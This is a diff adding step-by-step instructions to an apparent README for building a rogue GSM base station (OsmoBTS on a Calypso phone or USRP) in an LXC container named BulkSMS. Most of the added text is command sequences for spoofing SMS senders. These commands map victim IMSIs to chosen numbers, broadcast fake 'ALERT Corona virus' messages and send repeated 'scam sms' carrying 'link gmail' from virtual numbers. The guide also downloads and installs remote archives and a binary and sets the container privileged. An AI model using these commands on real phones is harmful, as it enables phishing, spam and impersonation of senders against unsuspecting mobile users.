@@ -630,7 +630,363 @@ ldconfig
 ```
 cd ..
 ```
+```
+exit
+```
+
 "# 8/8
+
+# Command you need : 
+```
+dmesg | grep ttyUSB*
+```
+
+# ADDING DEVICES ON LXC
+```
+lxc config device add BulkSMS ttyUSB0 unix-char path=/dev/ttyUSB0
+```
+```
+lxc config device add BulkSMS ttyUSB1 unix-char path=/dev/ttyUSB1
+```
+
+# REMOVING DEVICES ON LXC
+```
+lxc config device remove BulkSMS ttyUSB0 
+```
+```
+lxc config device remove BulkSMS ttyUSB1 
+```
+
+# CONFIGURING SCRIPT
+```
+lxc exec BulkSMS -- bash
+```
+```
+wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts-v3.zip
+```
+```
+unzip osmo-nitb-scripts-calypsobts-v3.zip 
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Installing network signal guru on your android phone  
+And finding the arfcn that this one is connect  
+Let's name this arfcn as 975  
+Configure arfcn at service/osmotrx.lms as 975
+```
+nano services/osmo-trx-lms3.service 
+```
+Save the configuration using ctrl+x
+mkdir /usr/src/CalypsoBTS/
+
+
+touch /usr/src/CalypsoBTS/hlr.sqlite3
+
+cd osmo-nitb-scripts-calypsobts
+
+```
+bash install_services.sh 
+```
+For avoiding lock database error 
+```
+fuser -k /usr/src/CalypsoBTS/hlr.sqlite3
+```
+```
+cd ..
+```
+```
+cp -rf src/trx/  /usr/src/CalypsoBTS/
+```
+```
+cd /usr/src/CalypsoBTS/
+```
+```
+cp trx/src/host/osmocon/osmocon ../CalypsoBTS/
+```
+```
+cp -rf trx/src/target/firmware/board ../CalypsoBTS/
+```
+```
+mv board/ firmwares
+```
+```
+cp trx/src/host/layer23/src/transceiver/transceiver ../CalypsoBTS/
+```
+```
+chmod +x osmocon
+```
+```
+chmod +x transceiver	
+```
+```
+nano /usr/src/CalypsoBTS/osmo-bts-trx-calypso.cfg
+```
+Change the config file as  : [osmo-bts-trx-calypso.cfg](https://github.com/SitrakaResearchAndPOC/nitb-script-all/blob/main/osmo-bts-trx-calypso.cfg)
+```
+exit
+```
+## Plug usb ttl
+
+```
+lxc config device add BulkSMS ttyUSB0 unix-char path=/dev/ttyUSB0
+```
+```
+lxc config device add BulkSMS ttyUSB1 unix-char path=/dev/ttyUSB1
+```
+```
+lxc config set BulkSMS security.privileged=true
+```
+
+## Testing TRX CALYPSO
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+```
+nano trx.sh
+```
+Don't use sudo terminal in trx.sh
+Running transceiver
+```
+bash trx.sh
+```
+Click button power of motorola phone  
+
+or on Terminal
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/trx.sh
+```
+Click button power of motorola phone  
+
+## Testing CALYPSO SpoofScript1
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/main_spoof.py
+```
+ctrl+shift+T
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+You could find imsi and extension  
+let's see for example imsi as 646040222463674 and extension as 126
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/scripts_spoof1/set_imsi_extension.sh 646040222463674 0341220590
+```
+Verify by if the association is correct
+let's see for example imsi as 646040222463674 and extension as 0341220590
+```
+bash finding_imsi_extenstion.sh
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
+Tape `*#001#` for finding your phone number (extension with osmo-bts)   
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof1/sending_sms_spoof_byextension.py
+```
+Sending for all extensions in osmo-bts
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof1/sending_sms_broadcast.py 
+```
+log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
+
+## Testing CALYPSO SpoofScript2
+ctrl+shift+T
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+You could find imsi and extension
+Create a virtual extension 0341220590 and send sms to existing extension eg : 164
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 164 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+Creating many extensions for sending a scam sms repeat 3 times
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_spam.py 164 3 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+Sending a broadcast sms by using a virtual number as extension 165
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py
+```
+## Testing TRX UHD (USRP)
+```
+wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/fork_QCSuperLXD/main/lxd-device
+```
+```
+chmod +x lxd-device
+```
+```
+sudo cp lxd-device /usr/local/bin
+```
+```
+lxd-device add BulkSMS usrp
+```
+```
+lxc exec BulkSMS -- uhd_images_downloader
+```
+```
+lxc exec BulkSMS --  uhd_usrp_probe 
+```
+```
+lxc exec BulkSMS -- uhd_find_devices 
+```
+```
+lxc exec BulkSMS -- bash
+```
+```
+mkdir /var/lib/osmocom/
+```
+```
+touch /var/lib/osmocom/hlr.sqlite3
+```
+```
+mkdir /etc/osmocom
+```
+```
+touch /etc/osmocom/osmo-trx-uhd.cfg
+```
+```
+nano osmo-trx-uhd.cfg
+```
+Add config
+```
+wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-v3.zip
+```
+```
+unzip osmo-nitb-scripts-v3.zip
+```
+```
+cd osmo-nitb-scripts
+```
+```
+bash install_services.sh 
+```
+```
+lxc exec BulkSMS -- bash 
+```
+```
+osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
+```
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd.py
+```
+```
+exit
+```
+
+
+## Testing USRP SpoofScript1
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+You could find imsi and extension  
+let's see for example imsi as 646040222463674 and extension as 126
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh 646040222463674 0341220590
+```
+Verify by if the association is correct
+let's see for example imsi as 646040222463674 and extension as 0341220590
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
+Tape `*#001#` for finding your phone number (extension with osmo-bts)   
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py
+```
+Sending for all extensions in osmo-bts
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 
+```
+log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
+
+## Testing USRP SpoofScript2
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+You could find imsi and extension
+Create a virtual extension 0341220590 and send sms to existing extension eg : 164
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 164 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+Creating many extensions for sending a scam sms repeat 3 times
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_spam.py 164 3 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+Sending a broadcast sms by using a virtual number as extension 165
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
+```
+```
+exit
+```
+
+
+## SAVING IMAGE :
+```
+lxc publish BulkSMS --alias BulkSMS -f
+```
+Instance published with fingerprint: 0fd7664a00694613964919796da5d797f179a32df134f8a2bc46ae20dee62d69
+```
+lxc export BulkSMS .
+```
+```
+md5sum 0fd7664a00694613964919796da5d797f179a32df134f8a2bc46ae20dee62d69.tar.gz 
+```
+06d4ed59da765e7e02427c6f4dd92b98  0fd7664a00694613964919796da5d797f179a32df134f8a2bc46ae20dee62d69.tar.gz
+
+```
+chmod 777 0fd7664a00694613964919796da5d797f179a32df134f8a2bc46ae20dee62d69.tar.gz
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
